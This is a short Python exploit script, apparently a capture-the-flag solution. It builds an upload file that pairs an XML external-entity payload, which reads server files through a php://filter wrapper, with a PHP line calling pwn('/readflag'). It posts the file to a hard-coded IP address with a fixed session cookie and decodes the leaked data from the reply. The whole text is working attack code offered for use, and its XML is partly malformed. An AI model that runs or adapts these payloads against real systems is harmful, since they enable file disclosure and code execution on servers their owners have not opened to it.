#!/usr/bin/env python3
import base64
import re
import requests

filename = '31_line_php_payload.php'
target = 'http://62.84.114.238'
command = '/readflag'

with open(filename, 'w') as f:
    f.write(
'''
<!DOCTYPE foo [ <!ELEMENT foo ANY> ]>
<!ENTITY payload SYSTEM "php://filter/convert.base64-encode/resource=http://62.84.114.238/upload/3354e780fbef91d0ebc5875d77aee578/{}"> ]>
<creds>
    <user>&payload;</user>
    <pass></pass>
</creds>
'''.format(filename) +
'''
<?php pwn('{}'); ?>
'''.format(command))

response = requests.post(target,
    files = {'data': (filename, open(filename, 'rb'))},
    data = {'data': 'test'},
    headers = {'Cookie': 'PHPSESSID=85ab80ed3e1f88a7827a75c5f9dc7c1f'}
)

match = re.search('You have logged in as user (.*)', response.text)
print(base64.b64decode(match[1]).decode())